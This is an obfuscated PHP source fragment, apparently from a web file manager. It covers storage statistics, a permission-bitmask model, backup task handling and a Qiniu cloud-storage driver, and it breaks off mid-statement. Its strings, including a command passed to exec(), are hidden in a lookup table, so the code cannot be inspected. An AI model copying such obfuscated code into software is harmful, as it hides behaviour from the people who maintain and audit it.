$»‰ë¯Ü¯[1823] => (int) $ïëæ¹–Ü, $»‰ë¯Ü¯[1824] => $•ßÃ¦„‹); } private function optionFile() { $Ø¬ˆõÈó =& $_SERVER[ì™ı‰º¯]; $™µÃñ· = $this->sourceSize(); $øÔŒÈ½ = $™µÃñ·[$Ø¬ˆõÈó[76]]; $Æ€î¨æÏ = $™µÃñ·[$Ø¬ˆõÈó[1793]]; $”‹¹¿†Ò = Model($Ø¬ˆõÈó[821])->where(array($Ø¬ˆõÈó[410] => 0))->count($Ø¬ˆõÈó[402]); $€ô»óÚŸ = array($Ø¬ˆõÈó[410] => 0, $Ø¬ˆõÈó[201] => array($Ø¬ˆõÈó[1013], strtotime(date($Ø¬ˆõÈó[1800])))); $óÅ»Ñ£ = Model($Ø¬ˆõÈó[821])->where($€ô»óÚŸ)->sum($Ø¬ˆõÈó[76]); $¾³‘ÛÖ™ = Model($Ø¬ˆõÈó[821])->where($€ô»óÚŸ)->count($Ø¬ˆõÈó[402]); return array($Ø¬ˆõÈó[759] => $øÔŒÈ½, $Ø¬ˆõÈó[1793] => $Æ€î¨æÏ, $Ø¬ˆõÈó[1825] => $øÔŒÈ½ - $Æ€î¨æÏ, $Ø¬ˆõÈó[1826] => (int) $óÅ»Ñ£, $Ø¬ˆõÈó[761] => (int) $”‹¹¿†Ò, $Ø¬ˆõÈó[1827] => (int) $¾³‘ÛÖ™); } private function optionAccess() { $®Ûã¢›² =& $_SERVER[ì™ı‰º¯]; return array($®Ûã¢›²[754] => $this->typeLogCnt(), $®Ûã¢›²[107] => $this->typeLogCnt($®Ûã¢›²[107]), $®Ûã¢›²[452] => $this->typeLogCnt($®Ûã¢›²[452]), $®Ûã¢›²[1828] => $this->typeLogCnt($®Ûã¢›²[1828]), $®Ûã¢›²[1829] => $this->typeLogCnt($®Ûã¢›²[1829]), $®Ûã¢›²[590] => $this->typeLogCnt($®Ûã¢›²[12], $®Ûã¢›²[1804])); } private function typeLogCnt($šÍ½íË¢ = '', $šúÏ”ñ = "\151\144") { $§ÈÆ©é =& $_SERVER[ì™ı‰º¯]; $’¤‡™œë = array($§ÈÆ©é[107] => array($§ÈÆ©é[1830], $§ÈÆ©é[1831]), $§ÈÆ©é[452] => array($§ÈÆ©é[1832], $§ÈÆ©é[1833]), $§ÈÆ©é[1828] => array($§ÈÆ©é[1834], $§ÈÆ©é[1835], $§ÈÆ©é[1836]), $§ÈÆ©é[1829] => array($§ÈÆ©é[1837], $§ÈÆ©é[1838]), $§ÈÆ©é[1839] => array($§ÈÆ©é[1840], $§ÈÆ©é[1841], $§ÈÆ©é[1842])); $ĞÀ™ø” = strtotime(date($§ÈÆ©é[1800])); $Íúµ‰Ó = array($§ÈÆ©é[201] => array($§ÈÆ©é[1013], $ĞÀ™ø”)); if ($šÍ½íË¢) { $Íúµ‰Ó[$§ÈÆ©é[33]] = array($§ÈÆ©é[7], $’¤‡™œë[$šÍ½íË¢]); } $Á™ ‹ï³ = Model($§ÈÆ©é[1803])->where($Íúµ‰Ó)->count($šúÏ”ñ); return (int) $Á™ ‹ï³; } private function optionServer() { $µø“ˆúè =& $_SERVER[ì™ı‰º¯]; $Âµá€Í = $this->diskDriver(); $·Ñªı’é = KodIO::defaultDriver(); $ùÇ‰•ş = array($µø“ˆúè[813] => $·Ñªı’é[$µø“ˆúè[399]]); $¨»¾ĞËÆ = Model($µø“ˆúè[471])->where($ùÇ‰•ş)->sum($µø“ˆúè[76]); $àëäÖæ˜ = explode($µø“ˆúè[53], $_SERVER[$µø“ˆúè[143]]); $çãşâºÄ = $àëäÖæ˜[0]; $ª€Ë›Ûõ = $GLOBALS[$µø“ˆúè[6]][$µø“ˆúè[21]]; $ÎÒïâÁ³ = $ª€Ë›Ûõ[$µø“ˆúè[975]]; if ($ÎÒïâÁ³ == $µø“ˆúè[963]) { $şüß› = explode($µø“ˆúè[1278], $ª€Ë›Ûõ[$µø“ˆúè[974]]); $ÎÒïâÁ³ = $şüß›[0]; } if ($ÎÒïâÁ³ == $µø“ˆúè[911] || $ÎÒïâÁ³ == $µø“ˆúè[800]) { $¾¶æÓÃ = Model()->db()->query($µø“ˆúè[1843]); $ó÷”ˆæÈ = $¾¶æÓÃ[0] && isset($¾¶æÓÃ[0][$µø“ˆúè[1568]]) ? $¾¶æÓÃ[0][$µø“ˆúè[1568]] : 0; $ÎÒïâÁ³ = $µø“ˆúè[1844] . ($ó÷”ˆæÈ ? $µø“ˆúè[8] . $ó÷”ˆæÈ : $µø“ˆúè[12]); } $ğ«ó‡¦ü = $GLOBALS[$µø“ˆúè[6]][$µø“ˆúè[349]][$µø“ˆúè[823]]; return array($µø“ˆúè[1845] => $Âµá€Í ? $Âµá€Í[$µø“ˆúè[1846]] : 0, $µø“ˆúè[1847] => $Âµá€Í ? $Âµá€Í[$µø“ˆúè[1848]] : 0, $µø“ˆúè[1849] => (int) $·Ñªı’é[$µø“ˆúè[1846]] * 1024 * 1024 * 1024, $µø“ˆúè[1850] => (int) $¨»¾ĞËÆ, $µø“ˆúè[1851] => ucfirst($çãşâºÄ), $µø“ˆúè[1852] => $µø“ˆúè[1853] . PHP_VERSION, $µø“ˆúè[1854] => phpBuild64() ? 64 : 32, $µø“ˆúè[753] => str_replace($µø“ˆúè[1129], $µø“ˆúè[991], $ÎÒïâÁ³), $µø“ˆúè[349] => ucfirst($ğ«ó‡¦ü), $µø“ˆúè[32] => $_SERVER[$µø“ˆúè[1855]]); } private function diskDriver() { $š²êÏ‘‘ =& $_SERVER[ì™ı‰º¯]; $­ÓäôÖÍ = $š²êÏ‘‘[8]; $ïÄáÃöû = $GLOBALS[$š²êÏ‘‘[6]][$š²êÏ‘‘[1295]] == $š²êÏ‘‘[1296]; if ($ïÄáÃöû) { $­ÓäôÖÍ = $š²êÏ‘‘[1856]; if (function_exists($š²êÏ‘‘[1857])) { exec($š²êÏ‘‘[1858], $ÂÜëÎŸ); $­ÓäôÖÍ = $ÂÜëÎŸ[1] . $š²êÏ‘‘[8]; } } if (!file_exists($­ÓäôÖÍ)) { return; } $£ÂŸ¾– = @disk_total_space($­ÓäôÖÍ); $¿­Ç½ìÄ = $£ÂŸ¾– - @disk_free_space($­ÓäôÖÍ); return array($š²êÏ‘‘[1846] => $£ÂŸ¾–, $š²êÏ‘‘[1848] => $¿­Ç½ìÄ); } public function fileChart($¨¼íÊÛâ) { $¾ğà›ş =& $_SERVER[ì™ı‰º¯]; if (isset($¨¼íÊÛâ[$¾ğà›ş[1670]])) { return Model($¾ğà›ş[821])->userFileTypeProfile($¨¼íÊÛâ[$¾ğà›ş[1670]]); } if (isset($¨¼íÊÛâ[$¾ğà›ş[1859]])) { return Model($¾ğà›ş[821])->groupFileTypeProfile($¨¼íÊÛâ[$¾ğà›ş[1859]]); } $ğÁá¤ÚÍ = $this->sourceSize(); $áÉš¿“õ = array($¾ğà›ş[432] => 0, $¾ğà›ş[411] => 1); $àâ•ªœš = Model($¾ğà›ş[821])->where($áÉš¿“õ)->sum($¾ğà›ş[76]); $áÉš¿“õ[$¾ğà›ş[411]] = 2; $¤ÊƒĞ„Ü = Model($¾ğà›ş[821])->where($áÉš¿“õ)->sum($¾ğà›ş[76]); return array($¾ğà›ş[759] => $ğÁá¤ÚÍ[$¾ğà›ş[76]], $¾ğà›ş[1793] => $ğÁá¤ÚÍ[$¾ğà›ş[1793]], $¾ğà›ş[1794] => (int) $àâ•ªœš, $¾ğà›ş[1795] => (int) $¤ÊƒĞ„Ü); } private function sourceSize() { $ßËÙµå« =& $_SERVER[ì™ı‰º¯]; $ºÉ¬»ê = Model($ßËÙµå«[821])->where(array($ßËÙµå«[410] => 0))->sum($ßËÙµå«[76]); $ƒîÈ«ß = Model($ßËÙµå«[471])->sum($ßËÙµå«[76]); if ($ƒîÈ«ß > $ºÉ¬»ê) { $ƒîÈ«ß = $ºÉ¬»ê; } return array($ßËÙµå«[76] => (int) $ºÉ¬»ê, $ßËÙµå«[1793] => (int) $ƒîÈ«ß); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¹“¹£Ğ =& $_SERVER[ì™ı‰º¯]; $æà¬‡¬ = array(array($¹“¹£Ğ[420] => LNG($¹“¹£Ğ[1860]), $¹“¹£Ğ[1861] => $¹“¹£Ğ[1862], $¹“¹£Ğ[1863] => 1, $¹“¹£Ğ[1864] => 1, $¹“¹£Ğ[1865] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¹“¹£Ğ[420] => LNG($¹“¹£Ğ[1866]), $¹“¹£Ğ[1861] => $¹“¹£Ğ[1867], $¹“¹£Ğ[1863] => 2, $¹“¹£Ğ[1864] => 1, $¹“¹£Ğ[1865] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¹“¹£Ğ[420] => LNG($¹“¹£Ğ[1868]), $¹“¹£Ğ[1861] => $¹“¹£Ğ[1869], $¹“¹£Ğ[1863] => 3, $¹“¹£Ğ[1864] => 1, $¹“¹£Ğ[1865] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¹“¹£Ğ[420] => LNG($¹“¹£Ğ[1870]), $¹“¹£Ğ[1861] => $¹“¹£Ğ[1871], $¹“¹£Ğ[1863] => 4, $¹“¹£Ğ[1864] => 1, $¹“¹£Ğ[1865] => self::AUTH_SHOW | self::AUTH_VIEW), array($¹“¹£Ğ[420] => LNG($¹“¹£Ğ[1872]), $¹“¹£Ğ[1861] => $¹“¹£Ğ[1873], $¹“¹£Ğ[1863] => 5, $¹“¹£Ğ[1864] => 1, $¹“¹£Ğ[1865] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¹“¹£Ğ[420] => LNG($¹“¹£Ğ[1874]), $¹“¹£Ğ[1861] => $¹“¹£Ğ[1875], $¹“¹£Ğ[1863] => 6, $¹“¹£Ğ[1864] => 1, $¹“¹£Ğ[1865] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¹“¹£Ğ[420] => LNG($¹“¹£Ğ[1876]), $¹“¹£Ğ[1861] => $¹“¹£Ğ[1877], $¹“¹£Ğ[1863] => 7, $¹“¹£Ğ[1864] => 1, $¹“¹£Ğ[1865] => 0)); return $æà¬‡¬; } public static function authCheck($ä¸® ¦ü, $ôË¼İÈ‚) { $Ú¹ŸòŒÒ =& $_SERVER[ì™ı‰º¯]; $ä¸® ¦ü = intval($ä¸® ¦ü); if ($GLOBALS[$Ú¹ŸòŒÒ[494]] && $GLOBALS[$Ú¹ŸòŒÒ[6]][$Ú¹ŸòŒÒ[1878]]) { return !0; } if ($ä¸® ¦ü <= 0) { return !1; } if (($ä¸® ¦ü & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ä¸® ¦ü & $ôË¼İÈ‚); } public static function authCheckShow($éÑ©şœË) { return self::authCheck($éÑ©şœË, self::AUTH_SHOW); } public static function authCheckView($Ó‘¹øàË) { return self::authCheck($Ó‘¹øàË, self::AUTH_VIEW); } public static function authCheckDownload($ôÉŸ¤Üº) { return self::authCheck($ôÉŸ¤Üº, self::AUTH_DOWNLOAD); } public static function authCheckUpload($®‰½«³) { return self::authCheck($®‰½«³, self::AUTH_UPLOAD); } public static function authCheckEdit($÷ÏÍÆ¹) { return self::authCheck($÷ÏÍÆ¹, self::AUTH_EDIT); } public static function authCheckRemove($³ÔŞÂİ°) { return self::authCheck($³ÔŞÂİ°, self::AUTH_REMOVE); } public static function authCheckShare($¹½í¬Äô) { return self::authCheck($¹½í¬Äô, self::AUTH_SHARE); } public static function authCheckComment($»ƒ“ÓÉ›) { return self::authCheck($»ƒ“ÓÉ›, self::AUTH_COMMENT); } public static function authCheckEvent($ñ£ÖÍ„ê) { return self::authCheck($ñ£ÖÍ„ê, self::AUTH_EVENT); } public static function authCheckRoot($»µê¡ë) { return self::authCheck($»µê¡ë, self::AUTH_ROOT); } public static function authCheckAction($¡ç–“ûø, $ü…Ù¾Û…) { $ØŸÆĞ™ =& $_SERVER[ì™ı‰º¯]; $÷ìè€¤š = array($ØŸÆĞ™[1879] => self::AUTH_VIEW, $ØŸÆĞ™[1193] => self::AUTH_DOWNLOAD, $ØŸÆĞ™[107] => self::AUTH_UPLOAD, $ØŸÆĞ™[1829] => self::AUTH_EDIT, $ØŸÆĞ™[1828] => self::AUTH_REMOVE, $ØŸÆĞ™[1839] => self::AUTH_SHARE, $ØŸÆĞ™[354] => self::AUTH_COMMENT, $ØŸÆĞ™[1658] => self::AUTH_EVENT, $ØŸÆĞ™[1880] => self::AUTH_ROOT); if (!isset($÷ìè€¤š[$ü…Ù¾Û…])) { return; } $åŠ±Š·¬ = $÷ìè€¤š[$ü…Ù¾Û…]; $¡ç–“ûø = intval($¡ç–“ûø); if ($¡ç–“ûø <= 0) { return !1; } if (($¡ç–“ûø & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¡ç–“ûø & $åŠ±Š·¬); } public static function authDisable($ø¤¶¸ı, $…¦º‰æ) { if (intval($ø¤¶¸ı) <= 0) { return 0; } return intval($ø¤¶¸ı) & ~$…¦º‰æ; } public $optionType = "\123\x79\163\164\x65\x6d\56\163\157\165\x72\x63\x65\101\165\x74\x68\114\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\x61\x75\164\x68", "\154\141\x62\x65\x6c", "\x64\151\163\x70\154\x61\171", "\163\x79\163\x74\145\x6d", "\x73\x6f\x72\x74"); public function initData() { $œ­•²ü± = $this->authDefault(); foreach ($œ­•²ü± as $§ÊÃãÙ) { $this->add($§ÊÃãÙ); } } public function findAuth($”şè¨õı, $”®´µ‡ú) { $ıªÖ®õ‡ =& $_SERVER[ì™ı‰º¯]; $½öÌáË¬ = parent::listData(); foreach ($½öÌáË¬ as $¥–×šğ÷) { $íÍİ‹ĞÏ = intval($¥–×šğ÷[$ıªÖ®õ‡[413]]); if ($íÍİ‹ĞÏ <= 0 || $¥–×šğ÷[$ıªÖ®õ‡[1881]] == 0) { continue; } if (($íÍİ‹ĞÏ & $”şè¨õı) != $”şè¨õı) { continue; } if (($íÍİ‹ĞÏ & $”®´µ‡ú) != 0) { continue; } return $¥–×šğ÷[$ıªÖ®õ‡[399]]; } return !1; } public function findAuthReadOnly() { $ğ¸éÎÈá = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ê¼¦à¨„ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ğ¸éÎÈá, $Ê¼¦à¨„); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÅÁÏëâê =& $_SERVER[ì™ı‰º¯]; $ò¤Üæ°“ = parent::listData(); $õõìÊÀ» = !1; foreach ($ò¤Üæ°“ as $ŠÛÅÜ¾µ) { if ($ŠÛÅÜ¾µ[$ÅÁÏëâê[413]] <= 0 || $ŠÛÅÜ¾µ[$ÅÁÏëâê[1881]] == $ÅÁÏëâê[198]) { continue; } if (!$õõìÊÀ») { $õõìÊÀ» = $ŠÛÅÜ¾µ; continue; } if ($õõìÊÀ»[$ÅÁÏëâê[413]] > $ŠÛÅÜ¾µ[$ÅÁÏëâê[413]]) { $õõìÊÀ» = $ŠÛÅÜ¾µ; } } return $õõìÊÀ» ? $õõìÊÀ»[$ÅÁÏëâê[399]] : $ÅÁÏëâê[12]; } public function listData($±ÍŒ¾ĞÅ = false, $²Öä½€ = "\163\x6f\x72\164", $º¶Şéıî = false) { return parent::listData($±ÍŒ¾ĞÅ, $²Öä½€, $º¶Şéıî); } public function update($•¥œá›, $¹òÊ˜¨÷) { $ÒûÃÕşÌ =& $_SERVER[ì™ı‰º¯]; $ˆÚé’§Ô = parent::listData($•¥œá›); $é”øûÔâ = $this->findByName($¹òÊ˜¨÷[$ÒûÃÕşÌ[32]]); if (!$ˆÚé’§Ô || $é”øûÔâ && $é”øûÔâ[$ÒûÃÕşÌ[399]] != $ˆÚé’§Ô[$ÒûÃÕşÌ[399]]) { return !1; } $this->filterAuth($¹òÊ˜¨÷[$ÒûÃÕşÌ[413]]); return parent::update($•¥œá›, $¹òÊ˜¨÷); } public function remove($Ì·“ÖœŒ) { $¥¯œà˜º = parent::listData($Ì·“ÖœŒ); if (!$¥¯œà˜º || $¥¯œà˜º[$_SERVER[ì™ı‰º¯][1283]]) { return !1; } return parent::remove($Ì·“ÖœŒ); } public function add($óÔÉ©ëš = array()) { $ïé™ï¼Î =& $_SERVER[ì™ı‰º¯]; if ($this->findByName($óÔÉ©ëš[$ïé™ï¼Î[32]])) { return !1; } $²ëøê½ì = array($ïé™ï¼Î[32] => $ïé™ï¼Î[12], $ïé™ï¼Î[413] => 1, $ïé™ï¼Î[1882] => $ïé™ï¼Î[1869], $ïé™ï¼Î[1881] => 1, $ïé™ï¼Î[1283] => 0, $ïé™ï¼Î[1883] => 0); $óÔÉ©ëš = array_merge($²ëøê½ì, $óÔÉ©ëš); $óÔÉ©ëš[$ïé™ï¼Î[1883]] = $this->getSort(); $this->filterAuth($óÔÉ©ëš[$ïé™ï¼Î[413]]); return parent::insert($óÔÉ©ëš); } private function getSort() { $Â¦µ×âà =& $_SERVER[ì™ı‰º¯]; $ŞøãŞ = parent::listData(); $÷ê†ÂË– = array_to_keyvalue($ŞøãŞ, $Â¦µ×âà[12], $Â¦µ×âà[1883]); return empty($÷ê†ÂË–) ? 0 : max($÷ê†ÂË–) + 1; } private function filterAuth(&$˜‡Ø¶ö×) { if (!$˜‡Ø¶ö×) { return; } $Íõüäî = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $œ›ıÊ¢¹ = array(); foreach ($Íõüäî as $‘øúè°) { if ($˜‡Ø¶ö× & $‘øúè°) { $œ›ıÊ¢¹[] = $‘øúè°; } } if (in_array(self::AUTH_ROOT, $œ›ıÊ¢¹)) { $˜‡Ø¶ö× = array_sum($Íõüäî); return; } $Ë¹ÔÉÅı = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($œ›ıÊ¢¹ as $‘øúè°) { if (isset($Ë¹ÔÉÅı[$‘øúè°])) { $œ›ıÊ¢¹ = array_merge($œ›ıÊ¢¹, $Ë¹ÔÉÅı[$‘øúè°]); } } $œ›ıÊ¢¹[] = self::AUTH_SHOW; $˜‡Ø¶ö× = array_sum(array_unique($œ›ıÊ¢¹)); } public function sort($ºëñ¾”, $øòÖ¤•Ü) { return parent::update($ºëñ¾”, $øòÖ¤•Ü); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\x62\141\143\153\x75\160\114\151\x73\x74"; public $field = array("\151\157", "\x6e\x61\155\145", "\x73\x74\141\164\x75\163", "\x63\157\x6e\x74\145\x6e\x74", "\155\x61\x6e\x75\x61\x6c", "\162\x65\x73\x75\154\x74", "\164\x69\x6d\145\106\x72\x6f\x6d", "\164\x69\x6d\145\124\x6f"); public function config() { $€®ÀÇÇÊ =& $_SERVER[ì™ı‰º¯]; $ÖêïÓ³„ = Model($€®ÀÇÇÊ[766])->get($€®ÀÇÇÊ[776]); $ÖêïÓ³„ = json_decode($ÖêïÓ³„, !0); $ÖêïÓ³„ = is_array($ÖêïÓ³„) ? $ÖêïÓ³„ : array(); if (!isset($ÖêïÓ³„[$€®ÀÇÇÊ[750]])) { $ÖêïÓ³„[$€®ÀÇÇÊ[750]] = $€®ÀÇÇÊ[88]; } unset($ÖêïÓ³„[$€®ÀÇÇÊ[1640]]); Action($€®ÀÇÇÊ[1884])->taskInit(); Model($€®ÀÇÇÊ[1639])->cacheClear(); $Œèê›šû = $€®ÀÇÇÊ[1885]; $Ï¤µ¼…µ = Model($€®ÀÇÇÊ[1886])->findByKey($€®ÀÇÇÊ[1658], $Œèê›šû); if (!$Ï¤µ¼…µ) { $Ï¤µ¼…µ = array(); } if (isset($Ï¤µ¼…µ[$€®ÀÇÇÊ[180]])) { $Ï¤µ¼…µ[$€®ÀÇÇÊ[180]] = json_decode($Ï¤µ¼…µ[$€®ÀÇÇÊ[180]], !0); } if (isset($ÖêïÓ³„[$€®ÀÇÇÊ[180]])) { $Ï¤µ¼…µ[$€®ÀÇÇÊ[180]][$€®ÀÇÇÊ[1643]] = $ÖêïÓ³„[$€®ÀÇÇÊ[180]]; unset($ÖêïÓ³„[$€®ÀÇÇÊ[180]]); } return array_merge($Ï¤µ¼…µ, $ÖêïÓ³„); } public function listData($Àûøõ• = false, $­óŸÉÛ = "\x6d\157\144\151\146\x79\124\151\x6d\x65", $ÅçØ©İõ = false) { return parent::listData($Àûøõ•, $­óŸÉÛ, !0); } public function lastItem() { $¨‰½ÔÆ = $this->listData(); return !empty($¨‰½ÔÆ[0]) ? $¨‰½ÔÆ[0] : null; } public function kill($Ä‹ıÓ·¨) { $å±„ø˜ô =& $_SERVER[ì™ı‰º¯]; $ºŠ©„­— = $this->listData($Ä‹ıÓ·¨); if (!$ºŠ©„­— || empty($ºŠ©„­—[$å±„ø˜ô[32]])) { return !0; } Task::kill($å±„ø˜ô[775]); Task::kill($å±„ø˜ô[796]); Task::kill($å±„ø˜ô[805]); $†ÊŸÁ£î = $ºŠ©„­—[$å±„ø˜ô[32]]; $¤Ğ×œŸ = TEMP_FILES . $å±„ø˜ô[774] . $†ÊŸÁ£î . $å±„ø˜ô[8]; IO::remove($¤Ğ×œŸ, !1); return $this->remove($Ä‹ıÓ·¨); } public function remove($Ù°¸Ö€) { $¡Ê„Ñäã = $this->listData($Ù°¸Ö€); if (!$¡Ê„Ñäã) { return !0; } return $this->backupRemove($¡Ê„Ñäã); } private function backupRemove($‰“œÂ¶–) { parent::remove($‰“œÂ¶–[$_SERVER[ì™ı‰º¯][399]]); $ííÚ•Ş = $this->backupPath($‰“œÂ¶–); IO::remove($ííÚ•Ş, !1); return !0; } private function backupPath($†ÕùÉ«å) { $“Ñ†ØÍ¸ =& $_SERVER[ì™ı‰º¯]; $ÇÙº = $†ÕùÉ«å[$“Ñ†ØÍ¸[32]]; $“Î‚÷ö = Model($“Ñ†ØÍ¸[766])->get($“Ñ†ØÍ¸[767]); $àñù¡â« = substr(md5($“Ñ†ØÍ¸[768] . $“Î‚÷ö . $ÇÙº), 0, 8); return "\x7b\x69\x6f\72{$†ÕùÉ«å[$“Ñ†ØÍ¸[747]]}\x7d\x2f\x64\x61\164\x61\142\x61\163\x65\x2f\x62\x61\143\x6b\165\160\57" . $ÇÙº . $“Ñ†ØÍ¸[11] . $àñù¡â«; } public function start() { $ñ‚‘¨Í =& $_SERVER[ì™ı‰º¯]; if ($GLOBALS[$ñ‚‘¨Í[6]][$ñ‚‘¨Í[89]][$ñ‚‘¨Í[1887]] != $ñ‚‘¨Í[88]) { return !0; } $ÜÄ³Û = $this->config(); if (!$ÜÄ³Û || $ÜÄ³Û[$ñ‚‘¨Í[1640]] != $ñ‚‘¨Í[88]) { return !1; } $Åü”æ¤› = $this->process(); foreach ($Åü”æ¤› as $„ä±’–¾) { if ($„ä±’–¾) { return Task::restart($„ä±’–¾[$ñ‚‘¨Í[399]]); } } $ˆœ­ºÚ÷ = new Backup(); $á­ò ’ô = $ˆœ­ºÚ÷->db(); if ($á­ò ’ô) { $á­ò ’ô = $ˆœ­ºÚ÷->dbFile(); if ($á­ò ’ô && $ÜÄ³Û[$ñ‚‘¨Í[750]] == $ñ‚‘¨Í[198]) { $á­ò ’ô = $ˆœ­ºÚ÷->file(); } } Backup::set(array($ñ‚‘¨Í[745] => 1, $ñ‚‘¨Í[757] => time())); return !0; } public function process() { $¥î¤Ó¦ =& $_SERVER[ì™ı‰º¯]; $ûÂòš‰Æ = array($¥î¤Ó¦[753] => Task::get($¥î¤Ó¦[775]), $¥î¤Ó¦[758] => Task::get($¥î¤Ó¦[796]), $¥î¤Ó¦[200] => Task::get($¥î¤Ó¦[805])); $¹Ã¬òäã = !1; foreach ($ûÂòš‰Æ as &$¸…øŠèå) { if ($¹Ã¬òäã) { $¸…øŠèå = !1; continue; } if ($¸…øŠèå) { $Âì†‘ã  = intval(_get($¸…øŠèå, $¥î¤Ó¦[1675], 0)); if (time() - $Âì†‘ã  > 7200) { Task::kill($¸…øŠèå[$¥î¤Ó¦[399]]); $¹Ã¬òäã = !0; $¸…øŠèå = !1; } } } return $ûÂòš‰Æ; } public function restore() { $£®ÆÆø =& $_SERVER[ì™ı‰º¯]; ActionCall($£®ÆÆø[1059], !0, 1); ActionCall($£®ÆÆø[1059], !0, 0); } } goto E¿Ş–Ù‘– ; AäÔÏÒÂ‚: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($‘öàµ×ø) { parent::__construct(); require_once SDK_DIR . $_SERVER[ì™ı‰º¯][1436]; $this->_init($‘öàµ×ø); } public function _init($ÜÃ£ùèË) { $Îƒøõ±Š =& $_SERVER[ì™ı‰º¯]; $this->config = $ÜÃ£ùèË; foreach ($ÜÃ£ùèË as $šÆ‡ÆøÑ => $ÄäÒ„®) { if (isset($this->{$šÆ‡ÆøÑ})) { $this->{$šÆ‡ÆøÑ} = $ÄäÒ„®; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Îƒøõ±Š[1437] . LNG($Îƒøõ±Š[1395])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¤¹ÕÎÒ±, $šÖîº• = '', $Í…£ƒ«Â = REPEAT_RENAME) { if ($this->setContent($¤¹ÕÎÒ±, $šÖîº•)) { return $this->getPathOuter($¤¹ÕÎÒ±); } return !1; } public function mkdir($ˆ˜íÄş±, $ÖëšÄ†š = REPEAT_SKIP) { $Œ—ıÑÎ‡ =& $_SERVER[ì™ı‰º¯]; $êä­êêÄ = trim($ˆ˜íÄş±, $Œ—ıÑÎ‡[8]); if ($this->_isFolder($êä­êêÄ)) { return $this->getPathOuter($êä­êêÄ); } $ˆ˜íÄş± = $êä­êêÄ . $Œ—ıÑÎ‡[8]; $ûï‡Ÿ‰œ = get_path_this($êä­êêÄ); $¢•·¼Ôû = $ˆ˜íÄş± . $ûï‡Ÿ‰œ; if (!$this->mkfile($¢•·¼Ôû)) { return !1; } if (!$this->moveFile($¢•·¼Ôû, $ˆ˜íÄş±)) { $this->delFile($¢•·¼Ôû); return !1; } return $this->getPathOuter($êä­êêÄ); } public function copyFile($‰Ìş£®, $ÆºÏ„…ä) { $«÷Ùâº = $this->bucketManager->copy($this->bucket, $‰Ìş£®, $this->bucket, $ÆºÏ„…ä, !0); return $«÷Ùâº ? !1 : $this->getPathOuter($ÆºÏ„…ä); } public function moveFile($æ¡£ÍŒŒ, $ğëÀÖå£) { $«ê¹û·ò = $this->bucketManager->move($this->bucket, $æ¡£ÍŒŒ, $this->bucket, $ğëÀÖå£, !0); return $«ê¹û·ò ? !1 : $this->getPathOuter($ğëÀÖå£); } public function delFile($ıçâ§Å) { if (!$this->exist($ıçâ§Å)) { return !0; } $×‡ÏŒ¢­ = $this->bucketManager->delete($this->bucket, $ıçâ§Å); return $×‡ÏŒ¢­ ? !1 : !0; } public function delFolder($‹† ëù) { $†“¬©…¦ =& $_SERVER[ì™ı‰º¯]; if (!$this->exist($‹† ëù)) { return !0; } $this->listItemCache = !1; $´‚×áô× = $this->fileList($‹† ëù); $this->listItemCache = !0; $Ğ“Àå°„ = trim($‹† ëù, $†“¬©…¦[8]) . $†“¬©…¦[8]; if (!empty($‹† ëù) && $‹† ëù !== $†“¬©…¦[198] && !in_array($Ğ“Àå°„, $´‚×áô×[$†“¬©…¦[82]])) { $´‚×áô×[$†“¬©…¦[82]][] = $Ğ“Àå°„; } $É¶–Å„¤ = $this->delByBatch($´‚×áô×[$†“¬©…¦[83]]); if (!$É¶–Å„¤) { return !1; } $É¶–Å„¤ = $this->delByBatch($´‚×áô×[$†“¬©…¦[82]]); if 